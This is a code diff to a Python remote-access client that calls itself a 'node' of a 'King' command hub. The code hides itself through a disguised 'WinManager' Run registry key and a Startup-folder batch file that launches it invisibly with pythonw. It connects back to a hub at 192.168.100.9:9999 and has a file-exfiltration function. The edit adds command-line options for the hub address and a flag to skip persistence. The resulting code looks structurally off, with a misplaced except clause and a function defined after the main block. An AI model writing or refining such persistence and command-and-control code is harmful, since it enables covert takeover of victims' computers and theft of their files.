@@ -39,6 +39,10 @@ def establish_persistence():
                 # Use 'pythonw' if you want it to be invisible, or 'python' for testing
                 f.write(f'@echo off\npythonw "{target_file}"')
             print("[*] Persistence established in Startup folder.")
+    except Exception as e:
+        print(f"[-] Persistence failed: {e}")
+        return target_file
+
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
@@ -46,8 +50,6 @@ def establish_persistence():
         print("[*] Registry persistence added.")
     except Exception as e:
         print(f"[-] Registry persistence failed: {e}")
-    except Exception as e:
-        print(f"[-] Persistence failed: {e}")
     return target_file
 
 def check_persistence(target_file):
@@ -221,19 +223,30 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
         # Exponential backoff: waits longer each time it fails, up to 30s
         delay = min(delay + 5, 30)
 
-if __name__ == '__main__':
-    # Initialize Persistence FIRST
-    target_file = establish_persistence()
-    
-    threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
-    
-    # Define Hub Details (Change the IP here to your King's IP)
-    HUB_IP = '192.168.100.9' 
-    HUB_PORT = 9999
-    
-    connect_to_hub(HUB_IP, HUB_PORT)
+def parse_args():
+    parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
+    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', '192.168.100.9'), help='IP address of the King command hub')
+    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', '9999')), help='Port of the King command hub')
+    parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
+    return parser.parse_args()
 
-    def exfiltrate_file(file_path):
+if __name__ == '__main__':
+    args = parse_args()
+
+    # Initialize Persistence FIRST unless testing without persistence
+    if not args.no_persist:
+        target_file = establish_persistence()
+        threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
+    else:
+        print('[*] Running without persistence for testing.')
+
+    if args.hub_ip == '192.168.100.9':
+        print('[*] WARNING: Using default HUB_IP 192.168.100.9. Update --hub-ip if King is on a different machine.')
+    print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
+    connect_to_hub(args.hub_ip, args.hub_port)
+
+
+def exfiltrate_file(file_path):
     if os.path.exists(file_path):
         with open(file_path, "rb") as f:
             data = f.read()
